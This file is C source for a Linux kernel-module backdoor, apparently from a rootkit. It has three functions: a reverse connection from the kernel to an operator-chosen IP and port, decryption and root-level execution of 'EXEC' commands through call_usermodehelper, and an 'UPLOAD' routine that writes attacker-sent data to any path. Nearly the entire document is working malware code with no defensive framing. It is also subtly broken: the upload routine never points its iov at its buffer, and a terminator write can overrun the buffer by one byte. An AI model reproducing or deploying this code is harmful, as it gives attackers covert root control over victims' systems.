#include "inc/backdoor.h"
#include "inc/utils.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <net/sock.h>
#include <linux/inet.h>

int backconnect(char *ip, int port) {
    struct socket *sock;
    struct sockaddr_in addr;
    int ret;

    if (sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0)
        return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = in_aton(ip);
    addr.sin_port = htons(port);

    ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0) {
        sock_release(sock);
        return ret;
    }

    ret = remote_command_execution(sock);
    sock_release(sock);
    return ret;
}

int remote_command_execution(struct socket *sock) {
    struct kvec iov;
    struct msghdr msg;
    char *buffer;
    int len;

    buffer = kmalloc(1024, GFP_KERNEL);
    if (!buffer)
        return -ENOMEM;

    memset(&msg, 0, sizeof(msg));
    memset(buffer, 0, 1024);

    while (1) {
        iov.iov_base = buffer;
        iov.iov_len = 1024;
        len = kernel_recvmsg(sock, &msg, &iov, 1, 1024, 0);
        if (len <= 0)
            break;

        encrypt_decrypt(buffer, len);
        if (strncmp(buffer, "EXIT", 4) == 0)
            break;
        if (strncmp(buffer, "EXEC ", 5) == 0) {
            buffer[len] = '\0';
            call_usermodehelper(buffer + 5, NULL, NULL, UMH_WAIT_EXEC);
        }
        if (strncmp(buffer, "UPLOAD ", 7) == 0) {
            buffer[len] = '\0';
            remote_file_transfer(sock);
        }
    }

    kfree(buffer);
    return 0;
}

int remote_file_transfer(struct socket *sock) {
    struct kvec iov;
    struct msghdr msg;
    char *buffer;
    struct file *filp;
    int len, ret;
    mm_segment_t old_fs;
    loff_t pos = 0;

    buffer = kmalloc(1024, GFP_KERNEL);
    if (!buffer)
        return -ENOMEM;

    memset(&msg, 0, sizeof(msg));
    memset(buffer, 0, 1024);

    len = kernel_recvmsg(sock, &msg, &iov, 1, 1024, 0);
    if (len <= 0) {
        kfree(buffer);
        return -1;
    }

    encrypt_decrypt(buffer, len);
    buffer[len] = '\0';

    filp = filp_open(buffer, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(filp)) {
        kfree(buffer);
        return PTR_ERR(filp);
    }

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    while ((len = kernel_recvmsg(sock, &msg, &iov, 1, 1024, 0)) > 0) {
        encrypt_decrypt(buffer, len);
        ret = kernel_write(filp, buffer, len, &pos);
        if (ret < 0) {
            filp_close(filp, NULL);
            set_fs(old_fs);
            kfree(buffer);
            return ret;
        }
    }

    filp_close(filp, NULL);
    set_fs(old_fs);
    kfree(buffer);
    return 0;
}
